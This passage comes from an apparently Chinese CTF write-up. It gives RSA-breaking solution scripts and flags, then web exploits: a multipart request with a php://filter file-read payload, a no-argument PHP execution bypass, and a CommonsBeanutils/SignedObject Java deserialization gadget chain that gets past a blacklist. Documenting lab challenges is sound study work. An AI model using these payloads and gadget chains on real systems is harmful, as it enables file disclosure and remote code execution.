</span></span><span class=line><span class=cl><span class=n>phi1</span> <span class=o>=</span> <span class=p>(</span><span class=n>p1</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q1</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>gcd</span><span class=p>(</span><span class=n>phi1</span><span class=p>,</span><span class=n>e1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>d1</span> <span class=o>=</span> <span class=n>invert</span><span class=p>(</span><span class=n>e1</span><span class=o>//</span><span class=n>t</span><span class=p>,</span><span class=n>phi1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m1</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>iroot</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>c1</span><span class=p>,</span><span class=n>d1</span><span class=p>,</span><span class=n>p1</span><span class=o>*</span><span class=n>q1</span><span class=p>),</span><span class=n>t</span><span class=p>)[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e2</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>dic2</span><span class=p>[</span><span class=s1>&#39;e&#39;</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ph</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>dic2</span><span class=p>[</span><span class=s1>&#39;p&#39;</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>dic2</span><span class=p>[</span><span class=s1>&#39;n&#39;</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c2</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>dic2</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>119234372387564173916926418564504307771905987823894721284221707768770334474240277144999791051191061404002537779694672314673997030282474914206610847346023297970473719280866108677835517943804329212840618914863288766846702119011361533150365876285203805100986025166317939702179911918098037294325448226481818486521</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=n>n</span><span class=o>//</span><span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>phi2</span> <span class=o>=</span> <span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d2</span> <span class=o>=</span> <span class=n>invert</span><span class=p>(</span><span class=n>e2</span><span class=p>,</span><span class=n>phi2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m2</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>c2</span><span class=p>,</span><span class=n>d2</span><span class=p>,</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=err>​</span>
</span></span><span class=line><span class=cl><span class=n>e3</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>dic3</span><span class=p>[</span><span class=s1>&#39;e&#39;</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c3</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>dic3</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>n3</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>dic3</span><span class=p>[</span><span class=s1>&#39;n&#39;</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gg</span> <span class=o>=</span> <span class=n>gcd</span><span class=p>(</span><span class=n>n3</span><span class=p>,</span><span class=n>c3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>q3</span> <span class=o>=</span> <span class=n>n3</span><span class=o>//</span><span class=n>gg</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>phi3</span> <span class=o>=</span> <span class=p>(</span><span class=n>gg</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q3</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d3</span> <span class=o>=</span> <span class=n>invert</span><span class=p>(</span><span class=n>e3</span><span class=p>,</span><span class=n>phi3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>c3</span><span class=p>,</span><span class=n>d3</span><span class=p>,</span><span class=n>n3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># M = 2022 * m * 1011 * p</span>
</span></span><span class=line><span class=cl><span class=n>m3</span> <span class=o>=</span> <span class=n>M</span><span class=o>//</span><span class=mi>2022</span><span class=o>//</span><span class=n>gg</span><span class=o>//</span><span class=mi>1011</span>
</span></span><span class=line><span class=cl><span class=n>m3</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>m3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>m1</span><span class=o>+</span><span class=n>m2</span><span class=o>+</span><span class=n>m3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># b&#39;PCL{16745c3b0c134c83b74f977260aae9b5}&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 第二部分sage求p</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>16676450704117406984592025063850900053789376003399190311720188158488886691280209555175830133393912861925677252847063707907536810656295135435030437243734401026617255634459734936796594942776689510859440558194110373664718925429745882204691083430639740384638701716026693412425164473472213091425769296148093070149231932577216369178892250824397978684233626964889041865056363294707998482306347934376164838745527260555009869036640749099896227929806275810818204261768115257353261726117067560402676352095817968864707164594118005516052080082446065707283304316695188972531988085450543617829295860842249432419321698844088907442789</span>
</span></span><span class=line><span class=cl><span class=n>p_fake</span> <span class=o>=</span> <span class=mi>119234372387564173916926418564504307771905987823894721284221707768770334474240277144999791051191061404002537779694672314673997030282474914206610847346023297970473719280866108677835517943804329212840618914863288766846702119011361533150365876285203805100986025166317939702179911918098037294324990096966084984832</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># pbits = 2048</span>
</span></span><span class=line><span class=cl><span class=n>pbits</span> <span class=o>=</span> <span class=n>p_fake</span><span class=o>.</span><span class=n>nbits</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># kbits = 900</span>
</span></span><span class=line><span class=cl><span class=n>kbits</span> <span class=o>=</span> <span class=mi>60</span>  <span class=c1># p失去的低位</span>
</span></span><span class=line><span class=cl><span class=n>pbar</span> <span class=o>=</span> <span class=n>p_fake</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span> <span class=o>^</span> <span class=n>pbits</span> <span class=o>-</span> <span class=mi>2</span> <span class=o>^</span> <span class=n>kbits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PR</span><span class=o>.</span> <span class=o>&lt;</span> <span class=n>x</span> <span class=o>&gt;</span> <span class=o>=</span> <span class=n>PolynomialRing</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=n>x</span> <span class=o>+</span> <span class=n>pbar</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>x0</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>small_roots</span><span class=p>(</span><span class=n>X</span><span class=o>=</span><span class=mi>2</span> <span class=o>^</span> <span class=n>kbits</span><span class=p>,</span> <span class=n>beta</span><span class=o>=</span><span class=mf>0.4</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>  <span class=c1># find root &lt; 2^kbits with factor &gt;= n^0.3</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>x0</span> <span class=o>+</span> <span class=n>pbar</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>baby_rsa</span>
</span></span><span class=line><span class=cl><span class=n>根据题目条件</span><span class=err>，</span><span class=mi>2</span><span class=o>^</span><span class=n>e</span><span class=o>=</span><span class=n>y</span><span class=p>(</span><span class=n>modn</span><span class=p>)</span><span class=err>，</span><span class=n>所以可以直接分解2</span><span class=o>^</span><span class=n>e</span><span class=o>-</span><span class=n>y</span><span class=err>，</span><span class=n>得到比较大的就是p</span><span class=err>，</span><span class=n>大小在16位附近的就是q</span><span class=err>；</span><span class=n>最后利用威尔逊定理处理一下模同余就行</span><span class=err>。</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>y</span><span class=o>=</span><span class=mi>4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span>
</span></span><span class=line><span class=cl><span class=n>e</span><span class=o>=</span><span class=mi>1049</span>
</span></span><span class=line><span class=cl><span class=c1>#print(2**e-y)</span>
</span></span><span class=line><span class=cl><span class=c1>#6027543349128250261061611850906664728536346779212426641088428544963356731129810885082371555056594134371892601742424667721105193534249189043570046638983977639217990098126731016259348067349430430582215063864805103884037137420179826541116808264617091019826898653792245614592655285387965751855503038673696439312640921935</span>
</span></span><span class=line><span class=cl><span class=err>​</span>
</span></span><span class=line><span class=cl><span class=n>c</span><span class=o>=</span><span class=mi>3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=mi>170229264879724117919007372149468684565431232721075153274808454126426741324966131188484635914814926870341378228417496808202497615585946352638507704855332363766887139815236730403246238633855524068161116748612090155595549964229654262432946553891601975628848891407847198187453488358420350203927771308228162321231</span>
</span></span><span class=line><span class=cl><span class=n>q</span><span class=o>=</span><span class=mi>34211</span>
</span></span><span class=line><span class=cl><span class=err>​</span>
</span></span><span class=line><span class=cl><span class=n>n</span><span class=o>=</span><span class=n>p</span><span class=o>*</span><span class=n>q</span>
</span></span><span class=line><span class=cl><span class=n>phi</span><span class=o>=</span><span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d</span><span class=o>=</span><span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>e</span><span class=p>,</span><span class=n>phi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cc</span><span class=o>=</span><span class=nb>pow</span><span class=p>(</span><span class=n>c</span><span class=p>,</span><span class=n>d</span><span class=p>,</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>k</span><span class=o>=</span><span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>gmpy2</span><span class=o>.</span><span class=n>fac</span><span class=p>(</span><span class=n>q</span><span class=p>),</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m</span><span class=o>=</span><span class=n>cc</span><span class=o>*</span><span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>k</span><span class=p>,</span><span class=n>p</span><span class=p>)</span><span class=o>%</span><span class=n>p</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>m</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]))</span>
</span></span><span class=line><span class=cl><span class=c1>#flag{7h3_73rr1b13_7h1ng_15_7h47_7h3_p457_c4n&#39;7_b3_70rn_0u7_by_175_r0075}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=baby_rsa>baby_rsa</h3><p>根据题目条件，2^e=y(modn)，所以可以直接分解2^e-y，得到比较大的就是p，大小在16位附近的就是q；最后利用威尔逊定理处理一下模同余就行。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import gmpy2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>y=4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377
</span></span><span class=line><span class=cl>e=1049
</span></span><span class=line><span class=cl>#print(2**e-y)
</span></span><span class=line><span class=cl>#6027543349128250261061611850906664728536346779212426641088428544963356731129810885082371555056594134371892601742424667721105193534249189043570046638983977639217990098126731016259348067349430430582215063864805103884037137420179826541116808264617091019826898653792245614592655285387965751855503038673696439312640921935
</span></span><span class=line><span class=cl>​
</span></span><span class=line><span class=cl>c=3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270
</span></span><span class=line><span class=cl>p=170229264879724117919007372149468684565431232721075153274808454126426741324966131188484635914814926870341378228417496808202497615585946352638507704855332363766887139815236730403246238633855524068161116748612090155595549964229654262432946553891601975628848891407847198187453488358420350203927771308228162321231
</span></span><span class=line><span class=cl>q=34211
</span></span><span class=line><span class=cl>​
</span></span><span class=line><span class=cl>n=p*q
</span></span><span class=line><span class=cl>phi=(p-1)*(q-1)
</span></span><span class=line><span class=cl>d=gmpy2.invert(e,phi)
</span></span><span class=line><span class=cl>cc=pow(c,d,n)
</span></span><span class=line><span class=cl>k=gmpy2.invert(gmpy2.fac(q),p)
</span></span><span class=line><span class=cl>m=cc*gmpy2.invert(k,p)%p
</span></span><span class=line><span class=cl>print(bytes.fromhex(hex(m)[2:]))
</span></span><span class=line><span class=cl>#flag{7h3_73rr1b13_7h1ng_15_7h47_7h3_p457_c4n&#39;7_b3_70rn_0u7_by_175_r0075}
</span></span></code></pre></td></tr></table></div></div><h2 id=web>web</h2><h3 id=简单包含>简单包含</h3><p>多传一个文件 用 分块来传输</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST / HTTP/1.1
</span></span><span class=line><span class=cl>Content-type: multipart/form-data; boundary=--------------------------55split
</span></span><span class=line><span class=cl>User-Agent: Firefox
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Host: 192.168.1.113
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Length: 362
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>----------------------------55split
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;&#34;; filename=&#34;1.py&#34;
</span></span><span class=line><span class=cl>Content-Type: application/octet-stream
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>HWO
</span></span><span class=line><span class=cl>----------------------------55split
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;flag&#34;
</span></span><span class=line><span class=cl>Content-Type: application/octet-stream
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>php://filter/read=convert.base64-encode/resource=flag.php
</span></span><span class=line><span class=cl>----------------------------55split--
</span></span></code></pre></td></tr></table></div></div><p>拿到base64的php文件 解码就有</p><h3 id=简单php>简单php</h3><p>只能无参数执行，那么利用url取反加二维数组绕过,使用end(getallheaders())来取命令去执行</p><p><img src=/img/2022-pcb-SU-Writeup/image1.png alt></p><p><img src=/img/2022-pcb-SU-Writeup/image2.png alt></p><h3 id=ez_java>Ez_java</h3><p>存在反序列化黑名单</p><p><img src=/img/2022-pcb-SU-Writeup/image3.png alt></p><p>但是存在cb依赖</p><p><img src=/img/2022-pcb-SU-Writeup/image4.png alt=1></p><p>可以尝试调用SignedObject的getobject二次反序列化</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>final</span> <span class=ne>Object</span> <span class=n>templates</span> <span class=o>=</span> <span class=n>Gadgets</span><span class=o>.</span><span class=n>createTemplatesImpl</span><span class=p>(</span><span class=n>command</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>mock</span> <span class=n>method</span> <span class=n>name</span> <span class=n>until</span> <span class=n>armed</span>
</span></span><span class=line><span class=cl><span class=n>final</span> <span class=n>BeanComparator</span> <span class=n>comparator</span> <span class=o>=</span> <span class=n>new</span> <span class=n>BeanComparator</span><span class=p>(</span><span class=s2>&#34;lowestSetBit&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>create</span> <span class=n>queue</span> <span class=n>with</span> <span class=n>numbers</span> <span class=ow>and</span> <span class=n>basic</span> <span class=n>comparator</span>
</span></span><span class=line><span class=cl><span class=n>final</span> <span class=n>PriorityQueue</span><span class=o>&lt;</span><span class=ne>Object</span><span class=o>&gt;</span> <span class=n>queue</span> <span class=o>=</span> <span class=n>new</span> <span class=n>PriorityQueue</span><span class=o>&lt;</span><span class=ne>Object</span><span class=o>&gt;</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>comparator</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>stub</span> <span class=n>data</span> <span class=k>for</span> <span class=n>replacement</span> <span class=n>later</span>
</span></span><span class=line><span class=cl><span class=n>queue</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>new</span> <span class=n>BigInteger</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=n>queue</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>new</span> <span class=n>BigInteger</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=k>switch</span> <span class=n>method</span> <span class=n>called</span> <span class=n>by</span> <span class=n>comparator</span>
</span></span><span class=line><span class=cl><span class=n>Reflections</span><span class=o>.</span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>comparator</span><span class=p>,</span> <span class=s2>&#34;property&#34;</span><span class=p>,</span> <span class=s2>&#34;object&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=k>switch</span> <span class=n>contents</span> <span class=n>of</span> <span class=n>queue</span>
</span></span><span class=line><span class=cl><span class=n>final</span> <span class=ne>Object</span><span class=p>[]</span> <span class=n>queueArray</span> <span class=o>=</span> <span class=p>(</span><span class=ne>Object</span><span class=p>[])</span> <span class=n>Reflections</span><span class=o>.</span><span class=n>getFieldValue</span><span class=p>(</span><span class=n>queue</span><span class=p>,</span> <span class=s2>&#34;queue&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ConstantTransformer</span> <span class=n>constant</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ConstantTransformer</span><span class=p>(</span><span class=ne>String</span><span class=o>.</span><span class=k>class</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>mock</span> <span class=n>method</span> <span class=n>name</span> <span class=n>until</span> <span class=n>armed</span>
</span></span><span class=line><span class=cl><span class=n>Class</span><span class=p>[]</span> <span class=n>paramTypes</span> <span class=o>=</span> <span class=n>new</span> <span class=n>Class</span><span class=p>[]</span> <span class=p>{</span> <span class=ne>String</span><span class=o>.</span><span class=k>class</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=ne>Object</span><span class=p>[]</span> <span class=n>args</span> <span class=o>=</span> <span class=n>new</span> <span class=ne>Object</span><span class=p>[]</span> <span class=p>{</span> <span class=s2>&#34;foo&#34;</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=n>InstantiateTransformer</span> <span class=n>instantiate</span> <span class=o>=</span> <span class=n>new</span> <span class=n>InstantiateTransformer</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>paramTypes</span><span class=p>,</span> <span class=n>args</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>grab</span> <span class=n>defensively</span> <span class=n>copied</span> <span class=n>arrays</span>
</span></span><span class=line><span class=cl><span class=n>paramTypes</span> <span class=o>=</span> <span class=p>(</span><span class=n>Class</span><span class=p>[])</span> <span class=n>Reflections</span><span class=o>.</span><span class=n>getFieldValue</span><span class=p>(</span><span class=n>instantiate</span><span class=p>,</span> <span class=s2>&#34;iParamTypes&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>args</span> <span class=o>=</span> <span class=p>(</span><span class=ne>Object</span><span class=p>[])</span> <span class=n>Reflections</span><span class=o>.</span><span class=n>getFieldValue</span><span class=p>(</span><span class=n>instantiate</span><span class=p>,</span> <span class=s2>&#34;iArgs&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ChainedTransformer</span> <span class=n>chain</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ChainedTransformer</span><span class=p>(</span><span class=n>new</span> <span class=n>Transformer</span><span class=p>[]</span> <span class=p>{</span> <span class=n>constant</span><span class=p>,</span> <span class=n>instantiate</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>create</span> <span class=n>queue</span> <span class=n>with</span> <span class=n>numbers</span>
</span></span><span class=line><span class=cl><span class=n>PriorityQueue</span><span class=o>&lt;</span><span class=ne>Object</span><span class=o>&gt;</span> <span class=n>queue1</span> <span class=o>=</span> <span class=n>new</span> <span class=n>PriorityQueue</span><span class=o>&lt;</span><span class=ne>Object</span><span class=o>&gt;</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>new</span> <span class=n>TransformingComparator</span><span class=p>(</span><span class=n>chain</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=n>queue1</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>queue1</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>swap</span> <span class=ow>in</span> <span class=n>values</span> <span class=n>to</span> <span class=n>arm</span>
</span></span><span class=line><span class=cl><span class=n>Reflections</span><span class=o>.</span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>constant</span><span class=p>,</span> <span class=s2>&#34;iConstant&#34;</span><span class=p>,</span> <span class=n>TrAXFilter</span><span class=o>.</span><span class=k>class</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>paramTypes</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>Templates</span><span class=o>.</span><span class=k>class</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>templates</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>KeyPairGenerator</span> <span class=n>keyPairGenerator</span> <span class=o>=</span> <span class=n>KeyPairGenerator</span><span class=o>.</span><span class=n>getInstance</span><span class=p>(</span><span class=s2>&#34;DSA&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>keyPairGenerator</span><span class=o>.</span><span class=n>initialize</span><span class=p>(</span><span class=mi>1024</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>KeyPair</span> <span class=n>keyPair</span> <span class=o>=</span> <span class=n>keyPairGenerator</span><span class=o>.</span><span class=n>genKeyPair</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=n>PrivateKey</span> <span class=n>privateKey</span> <span class=o>=</span> <span class=n>keyPair</span><span class=o>.</span><span class=n>getPrivate</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=n>Signature</span> <span class=n>signature</span> <span class=o>=</span> <span class=n>Signature</span><span class=o>.</span><span class=n>getInstance</span><span class=p>(</span><span class=n>privateKey</span><span class=o>.</span><span class=n>getAlgorithm</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=n>SignedObject</span> <span class=n>signedObject</span> <span class=o>=</span> <span class=n>new</span> <span class=n>SignedObject</span><span class=p>(</span><span class=n>queue1</span><span class=p>,</span> <span class=n>privateKey</span><span class=p>,</span> <span class=n>signature</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>queueArray</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>signedObject</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>queueArray</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>signedObject</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>queue</span><span class=p>;</span>
